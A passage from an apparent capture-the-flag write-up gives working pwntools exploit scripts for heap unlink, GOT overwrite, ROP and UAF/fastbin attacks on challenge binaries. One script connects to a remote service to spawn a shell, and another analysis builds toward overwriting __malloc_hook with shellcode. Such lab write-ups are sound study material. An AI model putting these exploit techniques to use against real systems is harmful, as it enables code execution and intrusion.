class="title">create</span>(<span class="params">size,index,content</span>):</span>  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input size\n&#x27;</span>,<span class="built_in">str</span>(size))  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input cun\n&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Input content\n&#x27;</span>,content)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span>  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Chose one to dele\n&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span>  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Chose one to edit\n&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Input the content\n&#x27;</span>,content)  </span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your name: \n$&#x27;</span>,<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x100</span>,<span class="number">0</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">create(<span class="number">0x100</span>,<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">delete(-2)</span></span><br><span class="line"><span class="string">create(0x18,2,p32(0x200)+p32(0x100))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">create(<span class="number">0x70</span>,-<span class="number">2</span>,p32(<span class="number">0x200</span>)+p32(<span class="number">0x100</span>)+p32(<span class="number">0x100</span>))</span><br><span class="line"><span class="comment"># length of chunk2 is a must, or it must be smaller than 0x70</span></span><br><span class="line"></span><br><span class="line">chunk0 = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(content_list-<span class="number">0x18</span>)+p64(content_list-<span class="number">0x10</span>)</span><br><span class="line">chunk0 = chunk0.ljust(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">chunk1 = p64(<span class="number">0x100</span>)+p64(<span class="number">0x110</span>)</span><br><span class="line">edit(<span class="number">0</span>,chunk0+chunk1)</span><br><span class="line">delete(<span class="number">1</span>)   <span class="comment"># unlink</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>  <span class="comment"># padding</span></span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;free&#x27;</span>])+p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])+p64(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">edit(<span class="number">0</span>,p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">delete(<span class="number">1</span>)   <span class="comment"># call got.free to execute plt.puts</span></span><br><span class="line"></span><br><span class="line">puts_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)  </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27; 2.17 given, but 2.23 on remote, so the following doesn&#x27;t work</span></span><br><span class="line"><span class="string">libc_addr = puts_addr - libc.symbols[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">system_addr = libc_addr + libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">bin_sh_addr = libc_addr + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)  </span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)  </span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr))</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>Using <code>stackoverflow</code>:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./4-ReeHY-main&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="string">&#x27;32078&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./4-ReeHY-main&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./ctflibc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400da3</span></span><br><span class="line">main_addr = <span class="number">0x400C8C</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,index,content</span>):</span>  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input size\n&#x27;</span>,<span class="built_in">str</span>(size))  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input cun\n&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Input content\n&#x27;</span>,content)  </span><br><span class="line"></span><br><span class="line"><span class="comment"># fill &#x27;buf&#x27;, &#x27;dest&#x27;, &#x27;v3&#x27;, &#x27;nbytes&#x27; and &#x27;rbp&#x27; in order</span></span><br><span class="line"><span class="comment"># in fact only &#x27;v3&#x27; and &#x27;nbytes&#x27; have some limits here</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x80</span> + p64(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(main_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your name: \n$&#x27;</span>,<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">create(-<span class="number">1</span>,<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)  </span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)  </span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)  </span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x80</span> + p64(elf.got[<span class="string">&#x27;exit&#x27;</span>])+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your name: \n$&#x27;</span>,<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">create(-<span class="number">1</span>,<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Noleak"><a href="#Noleak" class="headerlink" title="Noleak"></a>Noleak</h2><p>Attachment: <a href="/filehost/apcaw/Noleak.zip">Noleak.zip</a><br>Description: None</p>
<p>This task requires to exploit <code>UAF</code>, <code>unlink</code>, <code>fastbin attack</code>, partial write bypass <code>PIE</code> and overwrite <code>__malloc_hook</code>.</p>
<h3 id="Information-1"><a href="#Information-1" class="headerlink" title="Information"></a>Information</h3><p>Unzip it:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ unzip Noleak.zip</span><br><span class="line">Archive:  Noleak.zip</span><br><span class="line">  inflating: timu</span><br><span class="line">  inflating: libc-2.23.so</span><br></pre></td></tr></table></figure>
<p>Check:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file timu</span><br><span class="line">timu: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6f6e16df39f3af5d7cc7e3c9d2deb35b4d3e0bdf, stripped</span><br><span class="line">$ checksec timu</span><br><span class="line">[*] &#x27;/root/timu&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">$ ./libc-2.23.so</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu10) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">Available extensions:</span><br><span class="line">        crypt add-on version 2.1 by Michael Glad and others</span><br><span class="line">        GNU Libidn by Simon Josefsson</span><br><span class="line">        Native POSIX Threads Library by Ulrich Drepper et al</span><br><span class="line">        BIND-8.2.3-T5B</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure>
<p>Pseudocode:<br><code>main</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">menu</span>();</span><br><span class="line">      v3 = <span class="built_in">read_num</span>();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in"><span class="keyword">delete</span></span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">update</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">LABEL_12:</span><br><span class="line">        <span class="built_in">write_func</span>(<span class="string">&quot;Wrong choice\n&quot;</span>, <span class="number">0xD</span>u);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      <span class="built_in">create</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>create</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> nbytes; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *nbytes_4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">write_func</span>(<span class="string">&quot;Size: &quot;</span>, <span class="number">6u</span>);</span><br><span class="line">  nbytes = <span class="built_in">read_num</span>();</span><br><span class="line">  nbytes_4 = <span class="built_in">malloc</span>(nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( nbytes_4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span> &amp;&amp; buf[i]; ++i )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">write_func</span>(<span class="string">&quot;List is Full!\n&quot;</span>, <span class="number">0xE</span>u);</span><br><span class="line">      <span class="built_in">free</span>(nbytes_4);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">write_func</span>(<span class="string">&quot;Data: &quot;</span>, <span class="number">6u</span>);</span><br><span class="line">      <span class="built_in">read</span>(<span class="number">0</span>, nbytes_4, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">      buf[i] = nbytes_4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>update</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">update</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> nbytes; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">write_func</span>(<span class="string">&quot;Index: &quot;</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="built_in">LODWORD</span>(v0) = <span class="built_in">read_num</span>();</span><br><span class="line">  v3 = (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v0 &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = buf[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v0];</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">write_func</span>(<span class="string">&quot;Size: &quot;</span>, <span class="number">6u</span>);</span><br><span class="line">      nbytes = <span class="built_in">read_num</span>();</span><br><span class="line">      <span class="built_in">write_func</span>(<span class="string">&quot;Data: &quot;</span>, <span class="number">6u</span>);</span><br><span class="line">      <span class="built_in">LODWORD</span>(v0) = <span class="built_in">read</span>(<span class="number">0</span>, buf[v3], nbytes);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>delete</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">write_func</span>(<span class="string">&quot;Index: &quot;</span>, <span class="number">7u</span>);</span><br><span class="line">  v0 = <span class="built_in">read_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">9</span> )</span><br><span class="line">    <span class="built_in">free</span>(buf[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><p>In <code>update()</code> it doesn’t check the <code>size</code>, which may cause overflow.</p>
<p>In <code>delete()</code> it doesn’t set freed pointer as <code>NULL</code>, so it is a <code>UAF</code>.</p>
<p>But it gets full <code>RELRO</code>, so <code>GOT</code> hijacking can’t work. We can overwrite <code>__malloc_hook</code> instead, and trigger it by calling <code>malloc</code>.</p>
<p>As it has <code>RWX</code> (readable, writable and executable) <code>bss</code> segment, we can write <code>shellcode</code> to it.</p>
<p>Though this program gets no <code>PIE</code>, we still needs <code>partial write</code> to bypass <code>PIE</code>, because <code>__malloc_hook</code> is in <code>libc</code> while it has <code>PIE</code> enabled.</p>
<p>To sum up, our general idea is to use <code>unlink</code> (by overflow) to control <code>buf</code>, then write <code>bss address</code> to <code>buf</code> item and write <code>shellcode</code> to <code>bss</code>. Then try to write <code>__malloc_hook</code> as <code>bss address</code> so that <code>shellcode</code> will be triggered by a new <code>malloc</code>.</p>
<p>The tricky part must be overwriting the <code>__malloc_hook</code> because we have analysed <code>unlink</code> but this part involves <code>unsorted bin attack</code>, <code>fastbin attack</code> and <code>partial write</code> bypass <code>PIE</code>, so I will get you some details.</p>
<p><a href="/archives/">Basic principle can be found in <em>“Heap Exploit Intro”</em></a></p>
<p>To write on <code>__malloc_hook</code> we have to alloc it first, by using <code>fastbin attack</code>; while its address can only be guessed by knowing <code>main_arena + 0x88</code> first, which needs <code>unsorted bin attack</code>.</p>
<p>For <code>unsorted bin attack</code> part: </p>
<ol>
<li>First <code>delete</code> one chunk <code>X</code> (belongs to <code>unsorted bin</code>), the <code>main_arena + 0x88</code> will be stored in its <code>fd</code>.<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x1444030 —▸ 0x7f051aa4ab78 (main_arena+88) ◂— xor    byte ptr [rax + 0x44], al /* 0x1444030 */</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure></li>
<li>Use <code>UAF</code> to overwrite last 2 bytes to set it as <code>__malloc_hook</code>. The randomization exists in loading <code>libc</code> but the last three digits will be fixed. As they are in the same memory page, only last 2 bytes are different, so the fourth digit from last is totally random.<br>Using brute force to break it.<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">(malloc_hook &amp; <span class="number">0xffff</span>) - <span class="number">0x23</span></span><br></pre></td></tr></table></figure>
As it rands, there is always a time the last 2 bytes happen to be like this. Then use <code>UAF</code> to overwrite last 2 bytes of that chunk’s <code>fd</code>.</li>
</ol>
<p>Now it points to <code>__malloc_hook - 0x23</code>, check <em>“Heap Exploit Intro”</em> to see why is it, it’s for <code>fastbin attack</code>. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p &amp;__malloc_hook</span><br><span class="line">$1 = (void *(**)(size_t, const void *)) 0x7ffff7dd1b10 &lt;__malloc_hook&gt;</span><br><span class="line">pwndbg&gt; x/10gx 0x7ffff7dd1b10</span><br><span class="line">0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x00007ffff7a928a0      0x0000000000000000</span><br><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x7ffff7dd1b10-0x30</span><br><span class="line">0x7ffff7dd1ae0 &lt;_IO_wide_data_0+288&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd1af0 &lt;_IO_wide_data_0+304&gt;:   0x00007ffff7dd0260      0x0000000000000000</span><br><span class="line">0x7ffff7dd1b00 &lt;__memalign_hook&gt;:       0x00007ffff7a92ea0      0x00007ffff7a92a70</span><br><span class="line">0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x00007ffff7a928a0      0x0000000000000000</span><br><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x7ffff7dd1b10-0x23</span><br><span class="line">0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;:   0xfff7dd0260000000      0x000000000000007f</span><br><span class="line">0x7ffff7dd1afd: 0xfff7a92ea0000000      0xfff7a92a7000007f</span><br><span class="line">0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;:      0xfff7a928a000007f      0x000000000000007f</span><br><span class="line">0x7ffff7dd1b1d: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd1b2d &lt;main_arena+13&gt;: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>We can see a <code>0x7f</code> size chunk starts at <code>__malloc_hook</code> - <code>0x23</code>.</p>
<p>Then we do <code>fastbin attack</code>:</p>
<ol>
<li>Free chunk <code>A</code> and chunk <code>B</code> to build a <code>fastbin</code> list.<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x152b130 —▸ 0x152b0c0 ◂— 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure></li>
<li>To link chunk <code>X</code> into that <code>fastbin</code> list, we can also use <code>partial write</code> because in my <code>exploit</code> the chunk <code>B</code> and chunk <code>X</code> are adjacent, so only last byte is different:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x152b0c0 ◂— 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x152b030 —▸ 0x7efef02c7b78 (main_arena+88) ◂— xor    byte ptr [rax + 0x46], dh /* 0x152b030 */</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
The chunk <code>B</code> is <code>0x152b0c0</code> while chunk <code>X</code> is <code>0x152b030</code>. Just <code>update</code> the chunk before the chunk <code>X</code> to overflow and achieve the overwriting.</li>
<li>Now it should be:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x152b130 —▸ 0x152b030 ◂— 0x7febf8254aed</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
We <code>malloc</code> chunk in that <code>fastbin</code> list to alloc <code>0x7febf8254aed</code>(<code>__malloc_hook - 0x23</code>) out, then we can write <code>bss address</code> to it and use <code>malloc</code> to trigger <code>shellcode</code>.</li>
</ol>
<h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><p>Here it is:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;timu&#x27;</span>)</span><br><span class="line"><span class="comment"># sh = remote(&#x27;220.249.52.133&#x27;,&#x27;56588&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;timu&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = elf.bss() <span class="comment"># &#x27;0x601020&#x27;</span></span><br><span class="line">buf_addr = <span class="number">0x601040</span></span><br><span class="line">malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">exploit_addr = (malloc_hook &amp; <span class="number">0xffff</span>) - <span class="number">0x23</span> <span class="comment"># need to explain</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Data:&#x27;</span>,data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">index,size,data</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Data:&#x27;</span>,data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span>():</span></span><br><span class="line">    create(<span class="number">0x100</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># chunk 0</span></span><br><span class="line">    create(<span class="number">0x100</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x8</span>) <span class="comment"># chunk 1</span></span><br><span class="line">    payload1 = p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(buf_addr-<span class="number">0x18</span>)+p64(buf_addr-<span class="number">0x10</span>)</span><br><span class="line">    payload1 += <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x100</span>-<span class="number">4</span>*<span class="number">8</span>) </span><br><span class="line">    payload1 += p64(<span class="number">0x100</span>) + 